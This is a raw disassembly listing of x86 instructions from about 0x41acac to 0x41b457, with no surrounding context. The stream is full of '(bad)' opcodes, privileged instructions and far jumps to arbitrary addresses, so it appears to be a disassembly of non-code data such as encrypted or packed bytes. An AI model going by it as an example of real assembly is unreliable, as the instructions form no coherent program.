  41acac:	jae    0x41ad1b
  41acae:	xlat   BYTE PTR ds:[ebx]
  41acaf:	scas   eax,DWORD PTR es:[edi]
  41acb0:	or     BYTE PTR ds:0x1b29b15a,al
  41acb6:	mov    bl,0x7e
  41acb8:	outs   dx,BYTE PTR ds:[esi]
  41acb9:	xchg   ebp,eax
  41acba:	fucomi st,st(2)
  41acbc:	retf   0xe3e1
  41acbf:	aad    0xaf
  41acc1:	jg     0x41ac46
  41acc3:	xlat   BYTE PTR ds:[ebx]
  41acc4:	push   ds
  41acc5:	cmp    DWORD PTR [edx+0x23ab31bd],0x7
  41accc:	xor    eax,0x77f0a21c
  41acd1:	imul   edi,DWORD PTR [edx-0x74],0xfb5fc159
  41acd8:	fnstcw WORD PTR [ebx]
  41acda:	mov    edx,0xa0084c7e
  41acdf:	and    al,0x43
  41ace1:	cmp    al,0x8d
  41ace3:	es mov ah,0x7f
  41ace6:	sbb    eax,0xff3968f5
  41aceb:	add    DWORD PTR [esi-0x43af58d3],ebp
  41acf1:	inc    ebx
  41acf2:	js     0x41ad34
  41acf4:	ror    BYTE PTR [ebx],0xa6
  41acf7:	or     eax,0xe84667f3
  41acfc:	push   eax
  41acfd:	jp     0x41ad52
  41acff:	fidivr DWORD PTR [ecx]
  41ad01:	neg    DWORD PTR [ebx+0x10]
  41ad04:	jbe    0x41ad13
  41ad06:	adc    ebp,DWORD PTR [edi-0x526eac24]
  41ad0c:	or     ah,BYTE PTR [eax-0x23]
  41ad0f:	lahf   
  41ad10:	and    dl,BYTE PTR [edx]
  41ad12:	imul   ebx,DWORD PTR ss:[esi-0x1e],0xffffffd4
  41ad17:	fistp  DWORD PTR [edx+0x60]
  41ad1a:	push   edi
  41ad1b:	mov    ebx,0x38b89fa3
  41ad20:	jmp    0xdbdd:0x3407a10f
  41ad27:	push   0xc7c85441
  41ad2c:	adc    edi,edx
  41ad2e:	stos   DWORD PTR es:[edi],eax
  41ad2f:	sub    eax,0xf5c7f1a7
  41ad34:	(bad)  
  41ad35:	sbb    al,0xcf
  41ad37:	xor    eax,0xf4298cba
  41ad3c:	pop    ebx
  41ad3d:	in     al,dx
  41ad3e:	add    eax,0xbf0332b6
  41ad43:	lea    esi,[eax-0x1111d077]
  41ad49:	adc    bl,al
  41ad4b:	push   esp
  41ad4c:	sar    DWORD PTR ds:0xed72cea5,1
  41ad52:	sbb    bl,ah
  41ad54:	sar    edx,cl
  41ad56:	outs   dx,DWORD PTR ds:[esi]
  41ad57:	or     dh,al
  41ad59:	jo     0x41acdf
  41ad5b:	(bad)  
  41ad5c:	jl     0x41ad46
  41ad5e:	iret   
  41ad5f:	and    BYTE PTR [eax+0x7c],bl
  41ad62:	cmp    ecx,0xcc8d23dc
  41ad68:	psrld  mm7,QWORD PTR [ebp+0x52c0d07b]
  41ad6f:	pop    esp
  41ad70:	and    edi,esi
  41ad72:	or     al,0x3c
  41ad74:	and    DWORD PTR [edi+0x5],eax
  41ad77:	push   ebp
  41ad78:	pushf  
  41ad79:	mov    ah,0x3b
  41ad7b:	call   0x43208af2
  41ad80:	call   0x44aef88b
  41ad85:	and    eax,0x566d8bfa
  41ad8a:	xchg   ecx,eax
  41ad8b:	inc    ebx
  41ad8c:	rcl    DWORD PTR [esi+0x7d4857f7],1
  41ad92:	pop    edi
  41ad93:	fs sti 
  41ad95:	and    DWORD PTR [edi+0x1b],esp
  41ad98:	and    BYTE PTR [edx+edx*2],0x6b
  41ad9c:	stos   BYTE PTR es:[edi],al
  41ad9d:	pop    ds
  41ad9e:	sbb    DWORD PTR [eax+0x60],0xe4e4e70c
  41ada5:	sbb    DWORD PTR [ebp+0x56b2c22b],0x62f943c
  41adaf:	jge    0x41ad6d
  41adb1:	push   esi
  41adb2:	add    DWORD PTR [edx+ebx*2-0x2f3208b7],esi
  41adb9:	stos   DWORD PTR es:[edi],eax
  41adba:	cmc    
  41adbb:	push   0xccb6966d
  41adc0:	das    
  41adc1:	pop    ebp
  41adc2:	iret   
  41adc3:	retf   
  41adc4:	or     edx,ecx
  41adc6:	ret    
  41adc7:	xor    ah,BYTE PTR ds:0x4e9385f4
  41adcd:	and    ch,0x9a
  41add0:	dec    ecx
  41add1:	lods   al,BYTE PTR ds:[esi]
  41add2:	xor    BYTE PTR [edx-0x3d2cd1ab],0x11
  41add9:	lds    esp,FWORD PTR [ebx]
  41addb:	cs in  al,0xab
  41adde:	in     al,0x17
  41ade0:	enter  0x3a07,0x63
  41ade4:	cld    
  41ade5:	fdiv   DWORD PTR [ebx+0x43]
  41ade8:	ss jmp 0x272e:0x1370fb9b
  41adf0:	arpl   WORD PTR [eax+0x6b],ax
  41adf3:	xchg   bl,cl
  41adf5:	ss jno 0x41ae52
  41adf8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41adf9:	(bad)  
  41adfa:	repnz push esi
  41adfc:	xor    eax,0xc18574b9
  41ae01:	sti    
  41ae02:	or     DWORD PTR [esi+0xfa549f8],ebp
  41ae08:	mov    esp,0xdabc89c4
  41ae0d:	pop    esp
  41ae0e:	rol    bl,0x92
  41ae11:	cli    
  41ae12:	in     al,0x11
  41ae14:	or     esi,DWORD PTR [ecx+0x6a]
  41ae17:	push   ecx
  41ae18:	fldenv [ebx-0x60279819]
  41ae1e:	outs   dx,BYTE PTR ds:[esi]
  41ae1f:	icebp  
  41ae20:	pusha  
  41ae21:	add    BYTE PTR ds:0x116b83d8,0xe2
  41ae28:	cld    
  41ae29:	pop    edi
  41ae2a:	xchg   eax,ebp
  41ae2c:	mov    ah,BYTE PTR [ebx-0x62f2ce27]
  41ae32:	out    dx,al
  41ae33:	nop
  41ae34:	inc    edx
  41ae35:	sbb    DWORD PTR [esp+eax*4],ecx
  41ae38:	hlt    
  41ae39:	or     edi,ecx
  41ae3b:	dec    esp
  41ae3c:	stc    
  41ae3d:	add    al,0x74
  41ae3f:	push   ds
  41ae40:	push   ebx
  41ae41:	jnp    0x41ae00
  41ae43:	icebp  
  41ae44:	cmp    DWORD PTR [edi-0x123c3273],0xffffff84
  41ae4b:	push   ss
  41ae4c:	pop    ss
  41ae4d:	add    al,0x95
  41ae4f:	mov    ds:0x7402ea03,eax
  41ae54:	mov    esi,DWORD PTR ds:0x675a5cd7
  41ae5a:	ins    BYTE PTR es:[edi],dx
  41ae5b:	mov    ch,ah
  41ae5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae5e:	push   0x4f5ff85a
  41ae63:	mov    ecx,0x9354b206
  41ae68:	inc    ebx
  41ae69:	and    edx,DWORD PTR [edi-0x47a79b75]
  41ae6f:	lea    esi,[eax+0x56]
  41ae72:	out    0x41,eax
  41ae74:	cmp    eax,0x8a29896b
  41ae79:	popa   
  41ae7a:	sub    al,0xe1
  41ae7d:	arpl   WORD PTR [eax+0x2c],cx
  41ae80:	or     BYTE PTR [ebp-0x11f745b5],al
  41ae86:	xchg   esp,eax
  41ae87:	pusha  
  41ae88:	mov    ds:0x2af06f99,ax
  41ae8e:	adc    BYTE PTR [edx+edx*1-0x19],dl
  41ae92:	das    
  41ae93:	xchg   edx,eax
  41ae94:	(bad)  
  41ae95:	cmp    ah,bl
  41ae97:	iret   
  41ae98:	push   cs
  41ae99:	mov    dh,0x35
  41ae9b:	cli    
  41ae9c:	pop    eax
  41ae9d:	jecxz  0x41aed6
  41ae9f:	cmp    edi,edx
  41aea1:	adc    eax,DWORD PTR ds:[eax-0x2ad1bf73]
  41aea8:	icebp  
  41aea9:	jne    0x41ae39
  41aeab:	je     0x41aee1
  41aead:	sub    BYTE PTR [edi-0x3bd1bb3e],0x4d
  41aeb4:	into   
  41aeb5:	or     eax,0xbaa76530
  41aeba:	or     DWORD PTR [edi-0x6444054c],ebp
  41aec0:	pusha  
  41aec1:	or     al,0x6f
  41aec3:	in     eax,dx
  41aec4:	mov    eax,0xcbbb5f8b
  41aec9:	jne    0x41aeca
  41aecb:	cwde   
  41aecc:	sbb    edx,DWORD PTR [ebp+0x5476cce1]
  41aed2:	sub    BYTE PTR [eax+0x6f],al
  41aed5:	inc    ecx
  41aed6:	int3   
  41aed7:	jle    0x41af4a
  41aed9:	fistp  WORD PTR [esi]
  41aedb:	xor    ch,al
  41aedd:	lea    edi,[edx-0x4eacbe5c]
  41aee3:	sbb    ah,BYTE PTR [esi-0x7a]
  41aee6:	in     al,dx
  41aee7:	das    
  41aee8:	fbstp  TBYTE PTR [edi+0x38211412]
  41aeee:	add    DWORD PTR [ecx+0x6ff591ca],eax
  41aef4:	dec    ecx
  41aef5:	push   esp
  41aef6:	add    eax,0xbd28b99f
  41aefb:	cmp    BYTE PTR [edx],cl
  41aefd:	hlt    
  41aefe:	cmc    
  41aeff:	pop    ss
  41af00:	out    dx,eax
  41af01:	pop    eax
  41af02:	hlt    
  41af03:	xchg   esp,eax
  41af04:	jecxz  0x41af1f
  41af06:	in     al,0x92
  41af08:	inc    edx
  41af09:	mov    esi,0x82698de5
  41af0e:	mov    dh,0x67
  41af10:	ja     0x41aeb6
  41af12:	shl    DWORD PTR ds:0xca021b4a,0x61
  41af19:	imul   esp,esp,0x34
  41af1c:	jmp    0x9f0f:0xa79547aa
  41af23:	stc    
  41af24:	repz sub ah,BYTE PTR [edi-0x3]
  41af28:	push   ss
  41af29:	test   al,0x20
  41af2b:	(bad)  
  41af2c:	std    
  41af2d:	or     BYTE PTR [esi+0x47],dl
  41af30:	aaa    
  41af31:	ret    
  41af32:	or     al,0xcb
  41af34:	lea    eax,[edx-0x108db5b1]
  41af3a:	stc    
  41af3b:	shl    BYTE PTR [esi-0x1330d18a],cl
  41af41:	or     eax,esp
  41af43:	inc    esp
  41af44:	cmp    eax,0x40b2ec43
  41af49:	dec    esp
  41af4a:	push   edx
  41af4b:	(bad)  
  41af4c:	(bad)  [ebp-0x9538876]
  41af52:	sub    BYTE PTR [edx],bl
  41af54:	(bad)  
  41af55:	mov    cs,WORD PTR [esi-0x2c]
  41af58:	stc    
  41af59:	cwde   
  41af5a:	mov    bh,0xa5
  41af5c:	dec    eax
  41af5d:	or     BYTE PTR [ebx-0x51],0xe
  41af61:	aad    0x80
  41af63:	test   eax,0x8552585c
  41af68:	add    al,0x8d
  41af6a:	sti    
  41af6b:	test   al,0x9
  41af6d:	add    DWORD PTR [edx],ebp
  41af6f:	js     0x41aff0
  41af71:	mov    esp,0x958e7e6d
  41af76:	mov    ds:0xc313a0e9,eax
  41af7b:	mov    ebp,ecx
  41af7d:	fistp  DWORD PTR [esi]
  41af7f:	jle    0x41af87
  41af81:	cli    
  41af82:	mov    al,0x56
  41af84:	ja     0x41af37
  41af86:	jnp    0x41afb7
  41af88:	mov    WORD PTR [edx-0x7f92b0c6],cs
  41af8e:	dec    edi
  41af8f:	pusha  
  41af90:	xor    eax,0x697cff7a
  41af95:	test   BYTE PTR [edx+0x61],0xb1
  41af99:	adc    bl,BYTE PTR [ebx]
  41af9b:	jae    0x41affe
  41af9d:	push   ds
  41af9e:	imul   ecx,eax,0x17baea38
  41afa4:	push   es
  41afa5:	adc    eax,0x7b2fedd4
  41afaa:	xor    BYTE PTR [edi+0x7b2d76e4],dh
  41afb0:	mov    edx,ebx
  41afb2:	xor    bh,BYTE PTR [edi+0x51]
  41afb5:	jno    0x41af6a
  41afb7:	sub    esp,DWORD PTR [edx]
  41afb9:	into   
  41afba:	dec    esi
  41afbb:	jno    0x41af4b
  41afbd:	sbb    eax,DWORD PTR [ebp-0x73]
  41afc0:	mov    DWORD PTR [edx+0x21252b40],ecx
  41afc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41afc7:	aam    0x1b
  41afc9:	mov    al,ds:0xf39e5748
  41afce:	jb     0x41b032
  41afd0:	mov    ah,BYTE PTR [ebx+0x21]
  41afd3:	rol    BYTE PTR [eax-0x29],1
  41afd6:	loope  0x41af85
  41afd8:	xchg   ecx,eax
  41afd9:	iret   
  41afda:	sub    BYTE PTR [ebp-0x5d70b96],dh
  41afe0:	sbb    ebp,eax
  41afe2:	sti    
  41afe3:	daa    
  41afe4:	add    eax,0x76ba992d
  41afe9:	sub    bl,BYTE PTR [ebx+0x24]
  41afec:	add    DWORD PTR [edi-0xec15b75],ecx
  41aff2:	fimul  DWORD PTR [ebx+0x486ec9df]
  41aff8:	pop    ecx
  41aff9:	fisubr WORD PTR [esi+0xcb84ef0]
  41afff:	xor    BYTE PTR [eax-0x78],ah
  41b002:	cmp    bl,BYTE PTR [edx+0x6bde58a]
  41b008:	sbb    edi,DWORD PTR [ebx-0x79978525]
  41b00e:	out    dx,al
  41b00f:	into   
  41b010:	mov    eax,esi
  41b012:	aam    0x20
  41b014:	sub    dh,cl
  41b016:	and    al,0x1a
  41b018:	adc    ch,0x82
  41b01b:	lahf   
  41b01c:	dec    eax
  41b01d:	sub    dh,cl
  41b01f:	into   
  41b020:	mov    fs,WORD PTR [ecx+0x6f]
  41b023:	adc    eax,0x23080707
  41b028:	lea    edi,[edi+0x60]
  41b02b:	mov    esp,0x155872a9
  41b030:	daa    
  41b031:	xor    al,0x59
  41b033:	scas   eax,DWORD PTR es:[edi]
  41b034:	and    al,0x45
  41b036:	jne    0x41b02b
  41b038:	lods   eax,DWORD PTR ds:[esi]
  41b039:	mov    gs,WORD PTR [eax+0x48]
  41b03c:	test   BYTE PTR [eax-0x3f],bl
  41b03f:	sub    bh,BYTE PTR [ebx]
  41b041:	or     bh,BYTE PTR [edi+0x2b19b234]
  41b047:	adc    eax,0x711b0300
  41b04c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b04d:	sub    DWORD PTR [edi+0x2f],ecx
  41b050:	jl     0x41b085
  41b052:	or     BYTE PTR [esi+eiz*8-0x66],ah
  41b056:	ror    BYTE PTR [edx],0xe7
  41b059:	ds pop esi
  41b05b:	jmp    0x41b0af
  41b05d:	aad    0x26
  41b05f:	arpl   WORD PTR [ecx+0x5bb793b0],bp
  41b065:	shr    BYTE PTR [ebx-0x17e62a53],1
  41b06b:	adc    al,0x3
  41b06d:	push   esp
  41b06e:	iret   
  41b06f:	ret    0x6eb7
  41b072:	fwait
  41b073:	add    eax,0x81d6fc3f
  41b078:	inc    esi
  41b079:	imul   bh
  41b07b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b07c:	pop    ss
  41b07d:	mov    ah,0xf2
  41b07f:	adc    bl,BYTE PTR [ebx+0x52d8c1ba]
  41b085:	jo     0x41b0b6
  41b087:	sub    dl,dh
  41b089:	jle    0x41b0ca
  41b08b:	cmp    al,0x5d
  41b08d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b08e:	(bad)  
  41b08f:	xor    eax,0xacf021ee
  41b094:	(bad)  
  41b095:	popf   
  41b096:	mov    esp,0x68dc0915
  41b09b:	adc    al,0xe2
  41b09d:	push   es
  41b09e:	jmp    0x41b0be
  41b0a0:	add    al,0x99
  41b0a2:	jmp    0x41b0d5
  41b0a4:	mov    ds:0xac8f705e,eax
  41b0a9:	mov    edx,0x627104e1
  41b0ae:	push   es
  41b0af:	sar    BYTE PTR [edx+0x2],cl
  41b0b2:	cs mov ebp,ds
  41b0b5:	mov    ch,0xf0
  41b0b7:	sub    ch,BYTE PTR [edx-0x2a]
  41b0ba:	inc    ebp
  41b0bb:	mov    eax,0xbfc042a5
  41b0c0:	daa    
  41b0c1:	mov    bh,0xd3
  41b0c3:	xor    DWORD PTR [eax],eax
  41b0c5:	inc    esi
  41b0c6:	xchg   ebx,eax
  41b0c7:	enter  0xcebc,0xf
  41b0cb:	into   
  41b0cc:	xchg   edx,eax
  41b0cd:	mov    cl,0x97
  41b0cf:	cmc    
  41b0d0:	or     BYTE PTR [ecx-0xa5e95d],0x58
  41b0d7:	dec    ebp
  41b0d8:	xor    DWORD PTR [esi],edi
  41b0da:	loopne 0x41b084
  41b0dc:	ror    eax,0x1a
  41b0df:	ds adc al,cl
  41b0e2:	das    
  41b0e3:	cli    
  41b0e4:	cmp    edx,ebx
  41b0e6:	jmp    0x41b13b
  41b0e8:	xor    DWORD PTR [ebx+0x26],0x3a
  41b0ec:	sar    ah,1
  41b0ee:	cmp    al,0xd
  41b0f0:	nop
  41b0f1:	das    
  41b0f2:	stc    
  41b0f3:	xor    DWORD PTR [esi+0x7c3563b5],0x7fa0e335
  41b0fd:	popf   
  41b0fe:	retf   
  41b0ff:	inc    ebx
  41b100:	jno    0x41b0e2
  41b102:	popf   
  41b103:	hlt    
  41b104:	mov    esp,0x4dfeafd6
  41b109:	inc    ecx
  41b10a:	inc    edi
  41b10b:	call   0x186f:0xaf906223
  41b112:	ins    BYTE PTR es:[edi],dx
  41b113:	pop    ss
  41b114:	push   ds
  41b115:	push   esi
  41b116:	(bad)
  41b119:	aad    0xdc
  41b11b:	push   cs
  41b11c:	adc    DWORD PTR [esi+0x57],ecx
  41b11f:	adc    esp,DWORD PTR [eax+0x7f]
  41b122:	std    
  41b123:	xchg   DWORD PTR [ecx+0x653c8a47],ebp
  41b129:	rcr    BYTE PTR [ecx-0x2c936869],0xb6
  41b130:	fdiv   QWORD PTR [ebp+0x2]
  41b133:	shl    BYTE PTR [eax+0x65],cl
  41b136:	nop
  41b137:	std    
  41b138:	pop    ebx
  41b139:	(bad)  
  41b13a:	in     eax,0xdb
  41b13c:	out    0x99,al
  41b13e:	push   edx
  41b13f:	in     al,0x9a
  41b141:	add    BYTE PTR [ebx+esi*8],al
  41b144:	mov    DWORD PTR [edx-0x5e],ebx
  41b147:	dec    ebp
  41b148:	xor    BYTE PTR [ebx+0x32],0x27
  41b14c:	push   es
  41b14d:	cs inc edi
  41b14f:	cld    
  41b150:	xchg   bl,ch
  41b152:	out    0x12,eax
  41b154:	mov    bl,0x8
  41b156:	lds    edx,FWORD PTR [esi+esi*8]
  41b159:	into   
  41b15a:	mov    esi,0x823a9525
  41b15f:	daa    
  41b160:	test   bl,0xbf
  41b163:	and    BYTE PTR [edi+0x69],ch
  41b166:	add    cl,BYTE PTR [ebx+0x6017a502]
  41b16c:	arpl   bx,ax
  41b16e:	mov    al,0xb6
  41b170:	hlt    
  41b171:	and    DWORD PTR [ebx],edi
  41b173:	sbb    ebp,DWORD PTR [eax]
  41b175:	test   BYTE PTR [edi+eiz*4],bh
  41b178:	fmul   st,st(1)
  41b17a:	xchg   edx,eax
  41b17b:	mov    bl,0x88
  41b17d:	mov    edi,DWORD PTR [eax]
  41b17f:	imul   esi,DWORD PTR [edx-0x4d7a46a],0xffffffcd
  41b186:	rol    DWORD PTR [ebx-0x376cb787],1
  41b18c:	out    dx,al
  41b18d:	arpl   WORD PTR [ebx],ax
  41b18f:	pop    edx
  41b190:	mov    cl,BYTE PTR [eax]
  41b192:	pushf  
  41b193:	mov    ch,0xc5
  41b195:	mov    ecx,esp
  41b197:	repnz mov al,0xdb
  41b19a:	cmp    al,0xb2
  41b19c:	sti    
  41b19d:	ja     0x41b1bb
  41b19f:	xor    eax,0xc52db849
  41b1a4:	cdq    
  41b1a5:	add    cl,BYTE PTR [esi]
  41b1a7:	mov    DWORD PTR [ecx*8+0x5d024adc],ebp
  41b1ae:	sub    cl,BYTE PTR [edx]
  41b1b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b1b1:	push   ebp
  41b1b2:	les    ecx,FWORD PTR [esi-0x37c38f07]
  41b1b8:	mov    DWORD PTR [ebp+0x4eea1f75],ebp
  41b1be:	mov    ds:0xd9b502de,al
  41b1c3:	fsub   DWORD PTR [eax]
  41b1c5:	mov    ebp,0x87dcbcd3
  41b1ca:	push   ds
  41b1cb:	mul    edi
  41b1cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b1ce:	or     dh,ah
  41b1d0:	stos   DWORD PTR es:[edi],eax
  41b1d1:	fimul  DWORD PTR [esi]
  41b1d3:	cwde   
  41b1d4:	inc    edx
  41b1d5:	imul   edi,DWORD PTR [esi+ebp*8],0xfffffffa
  41b1d9:	xlat   BYTE PTR ds:[ebx]
  41b1da:	(bad)  
  41b1db:	in     al,dx
  41b1dc:	fwait
  41b1dd:	int3   
  41b1de:	push   edx
  41b1df:	pop    edi
  41b1e0:	push   eax
  41b1e1:	dec    ebp
  41b1e2:	arpl   WORD PTR [ebp+0xd],ax
  41b1e5:	lods   eax,DWORD PTR ds:[esi]
  41b1e6:	xor    dh,bl
  41b1e8:	xor    edi,DWORD PTR [ebp+edi*2+0xf]
  41b1ec:	ss and al,0x37
  41b1ef:	sbb    ebx,DWORD PTR [ecx-0xf]
  41b1f2:	lahf   
  41b1f3:	mov    ds:0xf46be592,eax
  41b1f8:	aas    
  41b1f9:	xchg   BYTE PTR [edi+0x55],bh
  41b1fc:	mov    BYTE PTR [ecx-0xc1ae2e3],bh
  41b202:	and    edi,DWORD PTR [eax+eiz*2-0x4d92f000]
  41b209:	jecxz  0x41b1aa
  41b20b:	or     BYTE PTR [ebp+0x1990376a],0x37
  41b212:	adc    eax,DWORD PTR [ebp-0x150dec51]
  41b218:	add    BYTE PTR [ebp-0x40d8c702],ah
  41b21e:	addr16 mov bh,0xdb
  41b221:	cmovle edi,DWORD PTR [ecx+0x6d68272]
  41b228:	loope  0x41b298
  41b22a:	mul    ebp
  41b22c:	mov    ah,0xe3
  41b22e:	out    0x13,al
  41b230:	xchg   esi,eax
  41b231:	add    eax,0xa9fd575f
  41b236:	cmp    al,0xc7
  41b238:	cdq    
  41b239:	hlt    
  41b23a:	aas    
  41b23b:	push   ebx
  41b23c:	pop    ecx
  41b23d:	jno    0x41b29a
  41b23f:	lahf   
  41b240:	std    
  41b241:	imul   esp,DWORD PTR [eax+edi*2-0x26b1eed8],0x41
  41b249:	popf   
  41b24a:	xor    eax,DWORD PTR [eax+0x7f3774d]
  41b250:	mov    ebx,0x39457722
  41b255:	jb     0x41b23b
  41b257:	add    DWORD PTR [ebp+0x4e08002d],ebp
  41b25d:	inc    eax
  41b25e:	cdq    
  41b25f:	mov    ds:0xdfa33c49,eax
  41b264:	test   BYTE PTR [ebx+0x49],cl
  41b267:	daa    
  41b268:	fimul  WORD PTR [ebp+0x355bdafc]
  41b26e:	arpl   WORD PTR [esi],bp
  41b270:	retf   
  41b271:	js     0x41b267
  41b273:	or     eax,0xbd29c4a
  41b278:	test   DWORD PTR [eax+edx*1],ebx
  41b27b:	xor    eax,0x64cf1ab3
  41b280:	sti    
  41b281:	mov    ah,0xe1
  41b283:	inc    ebx
  41b284:	ins    DWORD PTR es:[edi],dx
  41b285:	xor    BYTE PTR [eax+0x47a4200a],cl
  41b28b:	imul   ebx,DWORD PTR [edi-0x4eb9a0c4],0xffffffcd
  41b292:	jmp    0xb9e3:0xeb6da118
  41b299:	adc    edx,DWORD PTR [edx+0x60687070]
  41b29f:	pmaxub mm2,QWORD PTR [ecx+ecx*8]
  41b2a3:	xchg   esp,ebp
  41b2a5:	xchg   edi,edx
  41b2a7:	push   edx
  41b2a8:	sub    al,0x78
  41b2aa:	fwait
  41b2ab:	sbb    eax,0xf3f75cc3
  41b2b0:	cld    
  41b2b1:	xor    BYTE PTR [eax],ah
  41b2b3:	jb     0x41b24f
  41b2b5:	mov    ebp,0x1f5e3d50
  41b2ba:	mov    BYTE PTR [edi+0xe451eb3],0xf4
  41b2c1:	jl     0x41b2e6
  41b2c3:	push   eax
  41b2c4:	xlat   BYTE PTR ds:[ebx]
  41b2c5:	and    eax,0xcb30a4c6
  41b2ca:	hlt    
  41b2cb:	xchg   ecx,eax
  41b2cc:	and    al,0xe8
  41b2ce:	sbb    al,0xf8
  41b2d0:	les    eax,FWORD PTR [edi]
  41b2d2:	lock scas eax,DWORD PTR es:[edi]
  41b2d4:	retf   0x16ef
  41b2d7:	push   eax
  41b2d8:	shl    DWORD PTR [ebp-0x7ae53f16],cl
  41b2de:	mov    ebx,0xa8744004
  41b2e3:	fwait
  41b2e4:	pushf  
  41b2e5:	sub    eax,0x1716048d
  41b2ea:	rcr    eax,0x96
  41b2ed:	scas   al,BYTE PTR es:[edi]
  41b2ee:	xchg   esi,eax
  41b2ef:	mov    ?,WORD PTR [ebx-0x3d]
  41b2f2:	push   edx
  41b2f3:	mov    ds:0x64f500b1,eax
  41b2f8:	push   ecx
  41b2f9:	sub    al,0x6c
  41b2fb:	pop    es
  41b2fc:	das    
  41b2fd:	sub    al,BYTE PTR [edi]
  41b2ff:	js     0x41b29b
  41b301:	pop    eax
  41b302:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b303:	(bad)  
  41b304:	out    dx,eax
  41b305:	hlt    
  41b306:	dec    edx
  41b307:	jnp    0x41b337
  41b309:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b30a:	inc    esp
  41b30b:	push   edi
  41b30c:	ds loope 0x41b2e8
  41b30f:	loop   0x41b374
  41b311:	add    ch,BYTE PTR [edx]
  41b313:	cmovne esp,DWORD PTR [edi]
  41b316:	(bad)  
  41b318:	cmp    BYTE PTR [edi-0x4e88a90c],bh
  41b31e:	es inc ebp
  41b320:	imul   esi,DWORD PTR [ecx],0x13
  41b323:	xchg   edi,eax
  41b324:	mov    esi,0x67308216
  41b329:	pop    ss
  41b32a:	sbb    al,0xd5
  41b32c:	jmp    0xf984fcca
  41b331:	aas    
  41b332:	stos   DWORD PTR es:[edi],eax
  41b333:	jno    0x41b336
  41b335:	ficomp WORD PTR [ecx]
  41b337:	leave  
  41b338:	fs xchg ecx,eax
  41b33a:	mov    cl,0x6b
  41b33c:	adc    eax,0x5b7af8d9
  41b341:	(bad)  [esi+0x30]
  41b344:	push   ebp
  41b345:	dec    esi
  41b346:	mov    es,WORD PTR [edi-0x66]
  41b349:	sti    
  41b34a:	lahf   
  41b34b:	inc    ebx
  41b34c:	inc    ebx
  41b34d:	(bad)  
  41b34e:	sub    DWORD PTR [eax],ecx
  41b350:	(bad)  
  41b351:	fld    DWORD PTR [edx-0x2275c32e]
  41b357:	cli    
  41b358:	xchg   ebx,eax
  41b359:	cwde   
  41b35a:	lods   eax,DWORD PTR ds:[esi]
  41b35b:	aam    0x2
  41b35d:	cld    
  41b35e:	adc    al,0x76
  41b360:	mov    ecx,0x1d25615f
  41b365:	stc    
  41b366:	cmp    al,0x41
  41b368:	mov    ds:0x971a279a,al
  41b36d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b36e:	les    ebx,FWORD PTR [eax-0x26e5e507]
  41b374:	add    dl,BYTE PTR [edx+0x3e]
  41b377:	rcr    BYTE PTR [ebx+0xf],1
  41b37a:	rcr    BYTE PTR ss:0xeccbe4e3,0xa
  41b382:	fmul   DWORD PTR [edi+0xf]
  41b385:	or     edx,DWORD PTR [eax-0x3]
  41b388:	push   0x92de68b
  41b38d:	xchg   esi,eax
  41b38e:	ds icebp 
  41b390:	ds pop ebx
  41b392:	mov    al,BYTE PTR [eax+eiz*2]
  41b395:	das    
  41b396:	xchg   ebx,eax
  41b397:	imul   ebx,DWORD PTR [ecx+0xf],0x114f62c2
  41b39e:	xor    al,0xea
  41b3a0:	ins    BYTE PTR es:[edi],dx
  41b3a1:	lea    ebx,[ecx-0x5fb08ed6]
  41b3a7:	mov    al,0x88
  41b3a9:	cwde   
  41b3aa:	sbb    al,0x77
  41b3ac:	rol    BYTE PTR [ecx+edx*2+0x28],cl
  41b3b0:	popa   
  41b3b1:	clc    
  41b3b2:	std    
  41b3b3:	inc    edi
  41b3b4:	push   0xa999c10e
  41b3b9:	lods   eax,DWORD PTR ds:[esi]
  41b3ba:	les    edx,FWORD PTR [edi]
  41b3bc:	(bad)  
  41b3be:	dec    eax
  41b3bf:	mov    edx,0xef5c3994
  41b3c4:	mov    dh,0x15
  41b3c6:	jmp    0xd5fa:0xb318e16a
  41b3cd:	sahf   
  41b3ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b3cf:	xchg   ecx,eax
  41b3d0:	movups XMMWORD PTR [esi-0x10ea0e90],xmm4
  41b3d7:	mov    ch,0x32
  41b3d9:	(bad)  
  41b3da:	int3   
  41b3db:	cmc    
  41b3dc:	lock outs dx,DWORD PTR ds:[esi]
  41b3de:	mov    al,ds:0x248219ee
  41b3e3:	sub    al,0x32
  41b3e5:	fnsave [eax+0x44]
  41b3e8:	mov    edi,0x357d6e15
  41b3ed:	mov    ds:0x1ed02125,al
  41b3f2:	rcl    ebx,cl
  41b3f4:	(bad)  
  41b3f5:	loope  0x41b42c
  41b3f7:	mov    ecx,0x2aaa423b
  41b3fc:	fst    st(2)
  41b3fe:	loope  0x41b409
  41b400:	lock bound esp,QWORD PTR [edi+0x70e41dbc]
  41b407:	push   edi
  41b408:	or     al,0xe5
  41b40a:	jecxz  0x41b42b
  41b40c:	paddd  mm6,QWORD PTR cs:[ecx+0x2fc1edb]
  41b414:	xor    BYTE PTR [esi+ecx*8-0x7b],al
  41b418:	xchg   edi,eax
  41b419:	dec    eax
  41b41a:	add    edi,DWORD PTR [esi+0x143b5d53]
  41b420:	jb     0x82971b8b
  41b426:	inc    esi
  41b427:	push   ebx
  41b428:	stc    
  41b429:	lock mov al,0x63
  41b42c:	mov    ds:0x4e41ba1d,al
  41b431:	inc    esi
  41b432:	ret    
  41b433:	or     ecx,DWORD PTR [ebp+0x26]
  41b436:	sub    BYTE PTR [eax],bl
  41b438:	fwait
  41b439:	scas   al,BYTE PTR es:[edi]
  41b43a:	retf   0xc5f6
  41b43d:	lahf   
  41b43e:	test   eax,0xbff9b9f6
  41b443:	iret   
  41b444:	rol    DWORD PTR [ebp+eiz*4-0x30],cl
  41b448:	xor    DWORD PTR [edi+0x15],0x1
  41b44c:	loop   0x41b4c3
  41b44e:	push   edx
  41b44f:	and    eax,0x28171465
  41b454:	or     al,ch
  41b456:	dec    esp
  41b457:	stc    
